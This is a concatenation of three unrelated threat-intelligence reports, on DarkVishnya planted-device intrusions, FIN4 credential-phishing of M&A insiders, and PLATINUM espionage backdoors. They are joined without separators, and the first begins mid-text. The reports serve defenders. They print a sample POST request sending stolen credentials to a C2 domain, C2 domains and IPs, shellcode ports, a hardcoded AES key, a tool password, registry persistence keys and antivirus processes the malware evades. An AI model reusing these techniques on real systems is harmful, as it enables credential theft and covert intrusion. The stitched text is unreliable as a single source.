The devices used in the DarkVishnya attacks varied in accordance with the cybercriminals’ abilities and personal preferences. In the cases we researched, it was one of three tools:

netbook or inexpensive laptop
Raspberry Pi computer
Bash Bunny, a special tool for carrying out USB attacks
Inside the local network, the device appeared as an unknown computer, an external flash drive, or even a keyboard. Combined with the fact that Bash Bunny is comparable in size to a USB flash drive, this seriously complicated the search for the entry point. Remote access to the planted device was via a built-in or USB-connected GPRS/3G/LTE modem. At the second stage, the attackers remotely connected to the device and scanned the local network seeking to gain access to public shared folders, web servers, and any other open resources.
The aim was to harvest information about the network, above all, servers and workstations used for making payments. At the same time, the attackers tried to brute-force or sniff login data for such machines. To overcome the firewall restrictions, they planted shellcodes with local TCP servers. If the firewall blocked access from one segment of the network to another, but allowed a reverse connection, the attackers used a different payload to build tunnels. Having succeeded, the cybercriminals proceeded to stage three.
Here they logged into the target system and used remote access software to retain access. Next, malicious services created using msfvenom were started on the compromised computer. Because the hackers used fileless attacks and PowerShell, they were able to avoid allowlisting technologies and domain policies. If they encountered a allowlisting that could not be bypassed, or PowerShell was blocked on the target computer, the cybercriminals used impacket, and winexesvc.exe or psexec.exe to run executable files remotely. Verdicts
not-a-virus.RemoteAdmin.Win32.DameWare
MEM:Trojan.Win32.Cometer
MEM:Trojan.Win32.Metasploit
Trojan.Multi.GenAutorunReg
HEUR:Trojan.Multi.Powecod
HEUR:Trojan.Win32.Betabanker.gen
not-a-virus:RemoteAdmin.Win64.WinExe
Trojan.Win32.Powershell
PDM:Trojan.Win32.CmdServ
Trojan.Win32.Agent.smbe
HEUR:Trojan.Multi.Powesta.b
HEUR:Trojan.Multi.Runner.j
not-a-virus.RemoteAdmin.Win32.PsExec

Shellcode listeners
tcp://0.0.0.0:5190
tcp://0.0.0.0:7900

Shellcode connects
tcp://10.**.*.***:4444
tcp://10.**.*.**:4445
tcp://10.**.*.**:31337

Shellcode pipes
\\.\xport
\\.\s-pipe
SPECIAL REPORT SECURITY REIMAGINED HACKING THE STREET? FIN4 LIKELY PLAYING THE MARKET WRITTEN BY: BARRY VENGERIK KRISTEN DENNESEN JORDAN BERRY JONATHAN WROLSTAD FireEye is currently tracking a group that targets the email accounts of individuals privy to the most confidential information of more than 100 companies. The group, which we call FIN4, appears to have a deep familiarity with business deals and corporate communications, and their effects on financial markets. Operating since at least mid-2013, FIN4 distinctly focuses on compromising the accounts of individuals who possess non-public information about merger and acquisition (M&A) deals and major market-moving announcements, particularly in the healthcare and pharmaceutical industries. FIN4 has targeted individuals such as top executives, legal counsel, outside consultants, and researchers, among others. We are able to characterize FIN4’s activity from the incidents to which we have responded in our clients’ networks, FIN4’s attempts to compromise our managed service clients, our product detection data, and further independent research.

Our visibility into FIN4’s activities is limited to their network operations; we can only surmise how they may be using and potentially benefiting from the valuable information they are able to obtain. However one fact remains clear: access to insider information that could make or break stock prices for dozens of publicly traded companies could surely put FIN4 at a considerable trading advantage. KEY FINDINGS 100+ TARGETS Since mid-2013, FIN4 has targeted over 100 organizations, all of which are either publicly traded companies or advisory firms that provide services such as investor relations, legal counsel, and investment banking. Approximately two-thirds of the targeted organizations are healthcare and pharmaceutical companies. FIN4 knows their targets. Their spearphishing themes appear to be written by native English speakers familiar with both investment terminology and the inner workings of public companies. FIN4 does not infect their victims with malware, but instead focuses on capturing usernames and passwords to victims’ email accounts, allowing them to view private email correspondence.

FIN4 uses their knowledge to craft convincing phishing lures, most often sent from other victims’ email accounts and through hijacked email threads. These lures appeal to common investor and shareholder concerns, enticing the intended victims into opening the weaponized document and entering their email credentials. On multiple occasions, FIN4 has targeted several parties involved in a single business deal, to include law firms, consultants, and the public companies involved in negotiations. They also have mechanisms to organize the data they collect and have taken steps to evade detection. 4 fireeye.com Hacking the Street? FIN4 Likely Playing the Market Figure 1: FIN4’s Targets FireEye believes FIN4 intentionally targets individuals who have inside information about impending market catalysts—events that will cause the price of stocks to rise or fall substantially in a short period of time. Since at least mid-2013, FIN4 has pursued targets at more than 100 organizations, over two-thirds of which are public healthcare and pharmaceutical companies.

The remaining targets include advisory firms that represent public companies and a handful of public companies in other sectors closely followed by market watchers. All but three of the public companies are listed on the NYSE or NASDAQ, with the remaining three listed on non-US exchanges. APPLYING WALL STREET KNOW-HOW: FIN4’S TARGETS In order to get useful inside information, FIN4 compromises the email accounts of individuals who regularly communicate about marketmoving, non-public matters. FIN4 frequently targets: C-level executives and senior leadership Legal counsel Regulatory, risk, and compliance personnel Researchers Scientists People in other advisory roles TARGETED ORGANIZATIONS: OVER 100 PUBLICLY TRADED COMPANIES AND ADVISORY FIRMS Firms Advising Public Companies on Securities, Legal and M&A Matters 20% Other Publicly Traded Companies Publicly Traded 12% Healthcare and Pharmaceutical Companies 68%  Figure 2: Targeted healthcare and pharmaceutical industry sub-sectors M&A Deals in FIN4’s Crosshairs FIN4 focuses on acquiring information about ongoing M&A discussions and identifying the individuals who are most likely involved.

The group frequently employs M&A-themed and SEC-themed lures with Visual Basic for Applications (VBA) macros implemented to steal the usernames and passwords of these key individuals. Additionally, FIN4 has included links to fake Outlook Web App (OWA) login pages designed to capture the user’s credentials. Once equipped with the credentials, FIN4 then has access to real-time email communications—and presumably insight into potential deals and their timing. Many of FIN4’s lures appeared to be stolen documents from actual deal discussions that the group then weaponized and sent to individuals directly involved in the deal. In some cases, the discussions were public knowledge and widely reported in the media, while others were still in the early exploration and due diligence phases. In one instance, we observed FIN4 simultaneously target five different organizations involved in a single acquisition discussion. The group targeted individuals at the five firms several months before the organizations’ involvement in the acquisition talks went public.

Lasering in on Healthcare and Pharmaceuticals We believe FIN4 heavily targets healthcare and pharmaceutical companies as stocks in these industries can move dramatically in response to news of clinical trial results, regulatory decisions, or safety and legal issues. In fact, many high-profile insider trading cases involve the pharmaceutical sector. We’ve observed FIN4 access information on a wide variety of issues—including drug development, insurance reimbursement rates, and pending legal cases—all of which can significantly influence the price of healthcare industry stocks. In one case, FIN4 targeted employees involved in Medicaid rebates and government purchasing processes - these issues can heavily influence stock prices. Healthcare and pharmaceutical companies depend heavily on the decisions of large third party payers (like Medicaid) whose purchasing power and rebate decisions can make or break a company’s earnings. FIN4 would presumably use this information to evaluate healthcare companies’ future revenue. FIN4 HEALTHCARE TARGETS: OVER 60 PUBLIC COMPANIES IN VARIOUS SUB-INDUSTRIES BIOTECHNOLOGY 50% MEDICAL INSTRUMENTS & EQUIPMENT 12% MEDICAL DISTRIBUTION 2% MEDICAL DIAGNOSTICS & RESEARCH 5% MEDICAL DEVICES 13% HEALTHCARE PROVIDERS 3% HEALTHCARE PLANS 5% DRUG MANUFACTURERS 10%  Figure 3: Example of FIN4 Campaign Code Keeping it Organized FIN4 organizes the targets of their activity with over 70 unique “campaign codes” to designate the employer of the individuals they target, or in some cases the generic roles the targeted individuals play within that organization.

For example: CEO_CFO_COO_CORPDEV SCIENTISTS_AND_RESEARCH <PHARMACEUTICAL COMPANY NAME> <ADVISORY FIRM NAME> These campaign codes function as labels that FIN4 uses to identify the origin of usernames and passwords stolen from their targets. These campaign codes are transmitted to FIN4’s command and control (C2) servers along with stolen credentials. FIN4’s campaign codes illustrate their interest in the organizations and job roles most likely to have access to market-moving information before it goes public. After identifying a target, FIN4 frequently embeds VBA macros into a previously stolen Office document. The embedded macro displays a dialog box that mimics the Windows Authentication prompt for the user to enter their domain credentials. These credentials are transmitted to a server controlled by the group, allowing FIN4 to hijack that user’s email account. FIN4 also sends highly tailored emails that typically play on the recipient’s knowledge or interest in a pending deal. In several instances, FIN4 has included links to fake OWA login pages in their phishing emails instead (Figure 4).

This would be useful for targeting organizations that may have disabled VBA macros in Microsoft Office. FIN4’s Social Engineering FIN4 knows their audience. Their spearphishing themes appear to be written by native English speakers familiar with both investment terminology and the inner workings of public companies. FIN4’s phishing emails frequently play up shareholder and public disclosure concerns. Figure 4 shows the group’s strong command of an executive’s concerns over illicit public disclosure, particularly over executive incompetence and compensation issues. This email came from an account that FIN4 hijacked at a public company and includes several watchwords: “disclosure” of “confidential company information regarding pending transactions.” These specific issues are key terms at public companies, where the public disclosure of sensitive business information is strictly regulated. Figure 4: FIN4 phishing email to an executive TAKING CARE OF BUSINESS: FIN4’S TACTICS Subject: employee making negative comments about you and the company From: <name>@<compromised company’s domain> I noticed that a user named FinanceBull82 (claiming to be an employee) in an investment discussion forum posted some negative comments about the company in general (executive compensation mainly) and you in specific (overpaid and incompetent).

He gave detailed instances of his disagreements, and in doing so, may have unwittingly divulged confidential company information regarding pending transactions. I am a longtime client and I do not think that this will bode well for future business. The post generated quite a few replies, most of them agreeing with the negative statements. While I understand that the employee has the right to his opinion, perhaps he should have vented his frustrations through the appropriate channels before making his post. The link to the post is located here (it is the second one in the thread): http://forum.<domain>/redirect. php?url=http://<domain>%2fforum%2fequities%2f375823902%2farticle. php\par Could you please talk to him? Thank you for the assistance, <name>  While a large share of FIN4’s lures are previously stolen confidential company documents, the group occasionally uses generic lures of interest to the investment community (Figure 5). FIN4 also uses existing email threads in a victim’s inbox to spread their weaponized documents.

We’ve seen the actors seamlessly inject themselves into email threads. FIN4’s emails would be incredibly difficult to distinguish from a legitimate email sent from a previously compromised victim’s email account. The actors have also Bcc’d all recipients, making it even more difficult for recipients to decipher a malicious email from a legitimate one. A Fly on Many Walls In several of our investigations, FIN4 targeted multiple parties involved in a business deal, including law firms, consultants, and public companies. In one instance, FIN4 appeared to leverage its previously-acquired access to email accounts at an advisory firm (“Advisory Firm A”) to collect data during a potential acquisition of one of Advisory Firm A’s clients (“Public Company A”). FIN4 proceeded to send a spearphishing email from a compromised account at Advisory Firm A to another advisory firm (“Advisory Firm B”), who was also representing Public Company A. FIN4 used a SEC filing document as a lure.

After news of the possible acquisition was made public, Public Company A’s stock price varied significantly. It is likely that FIN4 used the inside information they had to capitalize on these stock fluctuations. Figure 5: Generic FIN4 Lure Document  ADVISORY FIRM B PUBLIC COMPANY A Involved in M&A discussions with Public COMPANY B Advisory Firm A and Advisory Firm B are advising Public Company A about a prospective M&A deal with Public Company B M&A-themed spearphish from hijacked account The spearphishing email pertains directly to the pending deal, which is not yet public at the time the spearphish is sent SEC-Themed spearphish from hijacked account. FIN4 uses a hijacked e-mail account at Advisory Firm A to spearphish M&A specialists at Advisory Firm B. Both Advisory Firm A and Advisory Firm B are advising Public Company A on a large M&A opportunity. FIN4 sends a second spearphishing email to the M&A team at Public Company A, as well as to several of the M&A team’s advisors at outside firms.

Public Company A announces its plans regarding a possible M&A deal with Public Company B. The market responds to the public announcement with wide fluctuations in the stock prices of both Public Company A and Public Company B. Figure 6: Outlook rule to filter emails Evading Detection FIN4 has been observed creating a rule in victims’ Microsoft Outlook accounts that automatically deletes any emails that contain words such as “hacked”, “phish”, “malware”, etc. (Figure 6). The group likely implements these rules to prevent compromised victims from receiving replies from intended targets that their email account may be compromised, and likely buys FIN4 extra time before victim organizations detect their activities. Conclusion If FIN4’s activities are indeed part of a sustained effort to gain advance access to market-moving information, it would not be the first time that network intrusions have played a role in an insider trading case. However the scale of FIN4’s operations, with targets at more than 100 public companies, coupled with their tactic of going after key individuals’ emails, sets this group apart.

Our visibility into FIN4 is limited to their network operations, so we cannot say for certain what happens after they gain access to insider information. What we can say is that FIN4’s network activities must reap enough benefit to make these operations worth supporting for over a year—and in fact, FIN4 continues to compromise new victims as we finish this report. APPENDIX: TACTICS FIN4 employs a simple, yet effective, method to gather targets’ user credentials through their spearphishing emails. Using VBA macros, they embed malicious code into already existing and legitimate company documents. Embedded in each Microsoft Word or Excel document is a malicious macro that prompts the user for their Outlook credentials. We have also observed this group send emails with links to fake Outlook Web App (OWA) login pages that will also steal the user’s credentials, however we have not observed this tactic in recent months. Figure 7: Example of “Module1” used in one of the most recent campaigns VBA Macros Embedded into Legitimate Documents The embedded VBA macro consists of a module typically entitled “Module1” and a user form that has been called both “UserForm1” and “UserLoginForm”.

The code in Module1 contains the information needed to communicate with the C2 server (Figure 7). The userform contains the code for the user credentials prompt and an artifact that is highly indicative of the actors’ targeting. The artifact (a campaign code) is usually tailored to the particular target company or the company from which they are targeting others; alternately, the artifact may represent a generic role for targeted individuals, such as SCIENTISTS_AND_RESEARCH or CEO_CFO_COO_CORPDEV. We have identified over 70 unique campaign codes to date. This campaign code is transmitted to the C2 server along with the victim’s username and password, as seen in Figure 8. Many of the fake Outlook windows opened by the macros contain the logo of the company targeted giving the pop-up apparent legitimacy. Figure 9 below represents a generic pop-up, with no company-specific information that a user might see after opening the document. Only after credentials are entered will the document appear for the user.

Figure 9: Malicious Dialogue that Prompts for User’s Credentials Figure 8: Example of “UserForm1” with Campaign Code  Figure 10: POST Request Containing User’s Credentials Sent to C2 Networking and Infrastructure After the user enters data into the username and password fields, the data is transmitted to the C2 server via a POST request (Figure 10). FIN4 then uses the collected credentials to login to victim email accounts. In addition to gaining access to the victim’s private communications, FIN4 also uses the compromised accounts to email malicious documents to additional targets inside and outside the victim company. The group is currently active as this report goes to publication and recently used the domains junomaat81[.]us and lifehealthsanfrancisco2015[.]com as their C2s. FIN4 appears to be heavily reliant on Tor (software that enables users to browse the Internet anonymously by encrypting their internet traffic and routing it through servers around the world) and has been seen using Tor to login to victims’ email accounts after obtaining the compromised user credentials.

We have detected at least two User Agents that the actors have used and which can be used to identify potentially suspicious OWA activity in network logs, when paired with originating Tor IP addresses. POST /report.php?msg=FAKE_PHARMA&uname=john.doe&pword=abc123 HTTP/1.1 Connection: Keep-Alive Content-Type: text/plain; Charset=UTF-8 Accept: */* Accept-Language: en-us User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0) Content-Length: 0 Host: www.junomaat81.us Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0 Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0 Figure 11: FIN4 User Agents  We have identified nine C2 domains that we believe were registered by the actors to conduct these operations. There are also legitimate domains that appear to have been compromised and used in previous campaigns in late 2013 and early 2014; however in the recent months we have not seen indications that the actor has used compromised legitimate domains to conduct their operations. What Can Network Defenders Do? The relative simplicity of FIN4’s tactics (spearphishing, theft of valid credentials, lack of any malware installed on victim machines) makes their intrusion activity difficult to detect.

However a few basic security measures can help Table 1: List of known Actor-Registered C2 Domains Actor-Registered C2 Domains ellismikepage[.]info lifehealthsanfrancisco2015[.]com rpgallerynow[.]info dmforever[.]biz msoutexchange[.]us junomaat81[.]us outlookscansafe[.]net nickgoodsite.co[.]uk outlookexchange[.]net thwart the group’s efforts. Disabling VBA macros in Microsoft Office by default, as well as blocking the domains listed in Table 1 will help protect against FIN4’s current activities. Additionally, enabling two-factor authentication for OWA and any other remote access mechanisms can help prevent credentials stolen in this manner from being leveraged successfully. Companies can also check their network logs for OWA logins from known Tor exit nodes if they suspect they are victimized. Typically, legitimate users do not use Tor for accessing email. While not conclusive, if paired with known targeting by this group, the access from Tor exit nodes can serve as an indicator of the group’s illicit logins.

PLATINUM Targeted attacks in South and Southeast Asia Windows Defender Advanced Threat Hunting Team This document is for informational purposes only. MICROSOFT MAKES NO WARRANTIES, EXPRESS, IMPLIED, OR STATUTORY, AS TO THE INFORMATION IN THIS DOCUMENT. This document is provided “as-is.” Information and views expressed in this document, including URL and other Internet website references, may change without notice. You bear the risk of using it. Microsoft proactively monitors the threat landscape for emerging threats. Part of this job involves keeping tabs on targeted activity groups, which are often the first ones to introduce new exploits and techniques that are later used widely by other attackers. In the previous volume, “STRONTIUM: A profile of a persistent and motivated adversary,” on page 3 of Microsoft Security Intelligence Report, Volume 19 (January–June 2015), chronicled the activities of one such group, which had attracted interest because of its aggressive, persistent tactics and techniques as well as its repeated use of new zero-day exploits to attack its targets. This section describes the history, behavior, and tactics of a newly discovered targeted activity group, which Microsoft has code-named PLATINUM. Microsoft is sharing some of the information it has gathered on this group in the hope that it will raise awareness of the group’s activities and help organizations take immediate advantage of available mitigations that can significantly reduce the risks they face from this and similar groups. Adversary profile PLATINUM has been targeting its victims since at least as early as 2009, and may have been active for several years prior. Its activities are distinctly different not only from those typically seen in untargeted attacks, but from many targeted attacks as well. A large share of targeted attacks can be characterized as opportunistic: the activity group changes its target profiles and attack geographies based on geopolitical seasons, and may attack institutions all over the world.
Like many such groups, PLATINUM seeks to steal sensitive intellectual property related to government interests, but its range of preferred targets is consistently limited to specific governmental organizations, defense institutes, intelligence agencies, diplomatic institutions, and telecommunication providers in South and Southeast Asia. The group’s persistent use of spear phishing tactics (phishing attempts aimed at specific individuals) and access to previously undiscovered zero-day exploits have made it a highly resilient threat. After researching PLATINUM, Microsoft has identified the following key characteristics of the group and its activities: PLATINUM has conducted several cyber espionage campaigns since at least 2009. PLATINUM focuses on a small number of campaigns per year, which reduces the risk of detection and helps the group stay unnoticed and focused for a longer period of time. PLATINUM has focused on targets associated with governments and related organizations in South and Southeast Asia. PLATINUM has used multiple unpatched vulnerabilities in zeroday exploits against its victims. Spear phishing is the group’s main method of infecting targeted users’ computers. PLATINUM makes a concerted effort to hide their infection tracks, by self-deleting malicious components, or by using server side logic in ‘one shot mode’ where remotely hosted malicious components are only allowed to load once PLATINUM often spear phishes its targets at their non-official or private email accounts, to use as a stepping stone into the intended organization’s network. PLATINUM uses custom-developed malicious tools and has the resources to update these applications often to avoid being detected. PLATINUM configures its backdoor malware to restrict its activities to victims’ working hours, in an attempt to disguise post-infection network activity within normal user traffic. PLATINUM does not conduct its espionage activity to engage in direct financial gain, but instead uses stolen information for indirect economic advantages. In some cases, the combination of these mechanisms—use of undisclosed zero-day exploits, custom malware that is not used elsewhere, PLATINUM’s skill in covering its tracks, and others—has enabled the group to compromise targets for several years without being detected.
Targeted activity groups are skilled at covering their tracks and evading detection, and it can be very difficult to definitively associate an activity group with a specific nation-state or group of individuals. Attackers could be patriotic groups, opportunistic cyber units, state-sponsored hackers, or intelligence agents. Although PLATINUM could belong to any one of the aforementioned categories, the group shows traits of being well funded, organized, and focused on information that would be of most use to government bodies. PLATINUM primarily targets its intended victims using spear phishing. There is also some data indicating the group’s usage of drive-by attacks against vulnerable browser-plugins. Although the group’s methods for performing reconnaissance to determine who to pursue remains unknown, the number of victims targeted at each affected institution is consistently very small. In some cases, the victims were targeted at their non-official email addresses, demonstrating that the scope of PLATINUM’s research capabilities is fairly extensive. For the initial infection, PLATINUM typically sends malicious documents that contain exploits for vulnerabilities in various software programs, with links or remotely loaded components (images or scripts or templates) that are delivered to targets only once. The group has made concerted efforts towards designing their initial spear-phishes in a manner where the final payload is only delivered to the intended victim. The group is known to have used a number of zero-day exploits, for which no security update is available at the time of transmission, in these attempts. (All have subsequently been addressed by security updates from the affected vendors.) Lure documents are typically given topical names that may be of interest to the recipient. Such lures often address controversial subjects or offer provocative opinions, in an effort to incite the reader into opening them. Figure 3 shows a sample of such titles. Figure 3.
Example document titles used by PLATINUM to deliver exploits SHA1 Filename e9f900b5d01320ccd4990fd322a459d709d43e4b Gambar gambar Rumah Gay Didiet Prabowo di Sentul Bogor.doc 9a4e82ba371cd2fedea0b889c879daee7a01e1b1 The real reason Prabowo wants to be President.doc 92a3ece981bb5e0a3ee4277f08236c1d38b54053 Malaysia a victim of American irregular warfare ops.doc 0bc08dca86bd95f43ccc78ef4b27d81f28b4b769 Tu Vi Nam Tan Mao 2011.doc f4af574124e9020ef3d0a7be9f1e42c2261e97e6 Indians having fun.doc These documents were sent to intended victims in Vietnam, Indonesia, India, and Malaysia, and the filenames contain references to cities, politicians, and current events in those locations. The oldest confirmed PLATINUM exploit was named “The corruption of Mahathir,” a document that was transmitted in 2009 referencing the former prime minister of Malaysia, Mahathir Mohamad. Figure 4. The oldest confirmed lure document sent by PLATINUM, in 2009 PLATINUM’s recent activities remain focused on tactics such as these. In February 2016, PLATINUM was observed using a legitimate website dedicated to news about the Indian government, as an infection vector. This site, which is not associated with the Indian government itself, also provides a free email service for its users, giving them email addresses with the site’s own domain name. PLATINUM sent spear phishing messages to users of the service, which included some Indian government officials. After infecting an unsuspecting user this way, the attackers had complete control of the user’s computer and used it as a stepping stone into the official network to which the user belonged. Figure 5. PLATINUM used a private webmail service to infect a government network PLATINUM’s approach toward exploiting vulnerabilities varies between campaigns. In one case from 2013, the target was sent a malicious document through a spear phishing email message.1 The document, when opened, used an embedded ActiveX control to download a JavaScript file from a remote site that used a previously unknown vulnerability in some versions of Windows (later designated CVE-2013-7331) to read information about the browser’s installed components.2 1 Microsoft thanks Google for identifying and reporting this attack. 2 Microsoft issued Security Bulletin MS14-052 in September 2014 to address the issue. CVE-2013-7331 has never affected Windows 10. Figure 6.
Malicious Word 2003 files used by PLATINUM to deliver CVE-2013-7331 Filename SHA1 URL for PNG Exploit Gerakan Anti SBY II.doc 1bdc1a0bc995c1beb363b11b71c14324be8577c9 mister.nofrillspace.com/users/web8_dice/4226/space.gif Tu_Vi_Nam_Tan_ Mao_2011.doc 2a33542038a85db4911d7b846573f6b251e16b2d intent.nofrillspace.com/users/web11_focus/3807/space.gif Wikileaks Indonesia.doc d6a795e839f51c1a5aeabf5c10664936ebbef8ea mister.nofrillspace.com/users/web8_dice/3791/space.gif Top 11 Aerial Surveillance Devices.doc f362feedc046899a78c4480c32dda4ea82a3e8c0 intent.nofrillspace.com/users/web11_focus/4307/space.gif SEMBOYAN_1.doc f751cdfaef99c6184f45a563f3d81ff1ada25565 www.police28122011.0fees.net/pages/013/space.gif Figure 7. Malicious JavaScript used by PLATINUM to perform fingerprinting on a victim’s browser While fingerprinting the versions of the browser plugins, the script loads a remotely hosted malicious PNG file that exploited another previously unknown vulnerability (designated CVE-2013-1331), which affected Microsoft Office 2003 SP3.3 Exploiting the vulnerability resulted in memory corruption, which allowed the attacker to execute remote code on the computer. Figure 8. An exploit mechanism used by PLATINUM Also a combination of lure documents with the aforementioned embedded ActiveX control was seen along with a Dipsind executable named as ‘pp4x322.dll’ during a different attack. The unique name of this executable indicated a possible DLL side-loading vulnerability also being used by PLATINUM against Powerpoint 2007. In another case from August 2015, Microsoft investigated a malicious document (named Resume.docx) that had been uploaded to the VirusTotal malware analysis service. The person who submitted the file did so through an IP address based in India, suggesting that the person or their organization had been targeted by the spear phish document. Figure 9. A malicious Word document used by PLATINUM to target a victim When the document was opened in Word, it exploited a previously unknown vulnerability in the Microsoft Office PostScript interpreter (designated CVE-2015-2545) that enabled it to execute the attacker’s code and drop an attacker-generated malicious DLL onto the computer.5 The DLL exploited another previously unknown vulnerability (designated CVE-2015-2546) in the Windows kernel, which enabled it to elevate privileges for the Word executable and subsequently install a backdoor through the application.6 Researching this attack and the malware used therein led Microsoft to discover other instances of PLATINUM attacking users in India around August 2015. Figure 10. Another exploit mechanism used by PLATINUM 5 Microsoft issued Security Bulletin MS15-099 in September 2015 to address the issue.
Windows 10 is not affected by the exploit used in this case due to built-in mitigations. 6 Microsoft issued Security Bulletin MS15-097 in September 2015 to address the issue. In total, PLATINUM made use of four zero-day exploits during these two attack campaigns (two remote code execution bugs, one privilege escalation, and one information disclosure), showing an ability to spend a non-trivial amount of resources to either acquire professionally written zero-day exploits from unknown markets, or research and utilize the zero-day exploits themselves. In both these campaigns the activity group included remote triggers to deactivate exploitation, with an attempt to conceal the vulnerability, and prevent analysis of the attack. The resources required to research and deploy multiple zero-day exploits within the same attack campaign are considerable. Such activity requires a significant amount of investment in research and development, along with the discipline to ensure that the exploits are not used until the appropriate time, and that no one involved with the project leaks them to other parties. Technical details After gaining access to a victim’s computer, PLATINUM installs its own custom-built malware to communicate with the compromised system, issue commands, and move laterally through the network. The wide collection of backdoors and tools, and the differences between them, suggest the involvement of multiple teams or vendors in the development process. This section describes some of the tools used by the group. Dipsind PLATINUM uses a number of different custom-developed backdoors to communicate with infected computers. The lack of any significant evidence of shared code between any of these backdoor families is another clue as to the scope of the resources on which the activity group is able to draw, and the precautions the group is willing and able to take in order to avoid losing its ability to conduct its espionage operations. The group’s most frequently used backdoors belong to a malware family that Microsoft has designated Dipsind, although some variants are detected under different names. Multiple Dipsind variants have been identified, all of which are believed to be used exclusively by PLATINUM.
The first variant, Win32/Dipsind.A!dha, is a lightweight application providing backdoor access to remote attackers. It can be customized for every victim to ensure that it remains undetected in targeted networks. It supports a small set of instructions that allow the attacker to perform basic functions, such as uploading or downloading files and spawning remote shells. PLATINUM used four zero-day exploits during these two campaigns. Figure 11. Sample configuration file for Win32/Dipsind.A Each Dipsind file contains an embedded encrypted configuration file that acts as a control for the backdoor. This configuration file also includes the initial command and control (C&C) location the Dipsind backdoor uses in addition to the pollcommandsite variable which references a URL where additional backup C&Cs can be polled. Configurable parameters include instructions on where Dipsind should install a copy of cmd.exe for spawning a remote shell, depending on the user’s privileges, the hours during which the backdoor should function, and exfiltrate information. This capability allows the backdoor to confine its activities to normal working hours, making its communications harder to distinguish from normal network traffic. Dipsind has been observed using a combination of IP addresses and domains for its C&C infrastructure. The domains are a mix of registered domains and free subdomains obtained through dynamic DNS providers. Collected data showed that a vast majority of victim networks allowed unfiltered access to the dynamic DNS hosts. The hosts and domains are hosted on compromised infrastructure based in several different countries, some within academic institutions. In some cases, the backdoors are configured to connect to IP addresses instead of domain names. These factors make it challenging to locate the activity group’s infrastructure. Figure 12 shows a sampling of C&C infrastructure used by PLATINUM between 2009 and 2015. Figure 12. Some of the domains and addresses used by PLATINUM Registered domains Dynamic DNS Hardcoded IPs box62.a-inet.net eclipse.a-inet.net joomlastats.a-inet.net updates.joomlastats.co.cc server.joomlastats.co.cc scienceweek.scieron.com mobileworld.darktech.org geocities.efnet.at bpl.blogsite.org wiki.servebbs.net 200.61.248.8 209.45.65.163 190.96.47.9 192.192.114.1 61.31.203.98 After Dipsind.A is installed on the victim’s computer, it connects to its C&C server for authentication.
All network traffic is over HTTP, base64 encoded, with the underlying data encrypted using AES256 in ECB mode. Authentication is a five-step process, as shown in the following figure: Figure 13. Win32/Dipsind.A initial communication protocol (as decrypted) Analysis of several samples of this variant show exactly the same AES key (AOPSH03SK09POKSID7FF674PSLI91965) in use since 2009. The initial HTTP POST made by this backdoor appears as “ud7LDjtsTHe2tWeC8DYo8A**”, which translates to a simple whitespace. This sequence makes a simple network indicator usable by defenders. A second Dipsind variant registers as a Winlogon Event Notify DLL. This backdoor contains a minimized feature list from the original Dipsind variant, and supports a more limited number of commands. It sets the following registry keys in the HKEY_LOCAL_MACHINE hive for persistence and functionality: SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\Asynchronous SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\DllName SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\Impersonate SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\Startup SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\Cscdll32\shutdown SOFTWARE\Microsoft\Windows\CurrentVersion\Run\cscdll32 There are at least two additional minor versions of this variant, each of which show improvements in command implementation. One interesting feature of this variant is the way it implements a mechanism similar to port knocking to allow remote attackers to connect to a compromised computer without leaving any connection open for too long. The sequence of events is as follows: 1. The backdoor is installed via an exploit. 2. The backdoor sets a registry key to open a specific UDP port through the local firewall, if any, and listens to the port for incoming traffic. 3. At a remote location, the attacker executes a tool (called PK2 here, although the actual name of the tool is unknown) using the following parameters: Pk2.exe <IP> <UDP Port> <TCP Port> <Password> where the IP address is that of the computer with the backdoor, the UDP port is the one specified by the backdoor, and the password is a string encrypted by the tool before being sent. 4. The backdoor receives the UDP packets, and then checks to see if the password is valid. 5. If the password is indeed valid, the backdoor will wait for exactly 20 seconds and only then open the PK2 specified TCP port for a window of 3 seconds.
Figure 14. How the Dipsind knocker component communicates with an attacker PK2 is also designed to connect to such open TCP ports and act as a console client for issuing commands to the backdoor. When running PK2 as a console client, the attacker needs to re-enter the password to authenticate a second time against the backdoor, and issue commands such as #sz to upload a file and #rz to download a file. During this research, one such collection of tools was obtained that had the password set to “t@ng0p@ss”. All communication used by this backdoor and PK2 is encrypted. If a connection from PK2 is not received within the 3-second window, the TCP port is shut and PK2 would need to reinitialize the port-knocking process. JPIN In addition to Dipsind and its variants, PLATINUM uses a few other families of custom-built backdoors within its attack toolset. These families of backdoors are significantly different in their capabilities and have completely different code bases. While one family relies on a small number of supported commands and simple shells, the other delves into more convoluted methods of injections, checks, and supported feature sets. Microsoft researchers refer to one such set of backdoor variants collectively as “JPIN,” which is the name of a service it uses when installed. JPIN is a comprehensive tool for executing and extracting information from the compromised computer. There is strong evidence to suggest that the developers of the JPIN and Dipsind code bases were in some way related. JPIN has its own installer and uninstaller component, which deletes itself when it encounters a version of Windows earlier than Windows XP, or finds any of these security-related processes running: Figure 15. Security-related processes avoided by the JPIN installer Process Security product 360tray.exe 360 Safeguard bdagent.exe BitDefender proguard.exe Process Guard blackd.exe BlackICE blackice.exe BlackICE savservice.exe Sophos Anti-Virus avp.exe Kaspersky Anti-Virus rstray.exe Rising Anti-virus cmccore.exe CMC Antivirus cmctrayicon.exe CMC Antivirus zhudongfangyu.exe 360 Safeguard After installing the backdoor, the installer deletes itself from the compromised computer. PLATINUM uses at least three distinct JPIN variants.
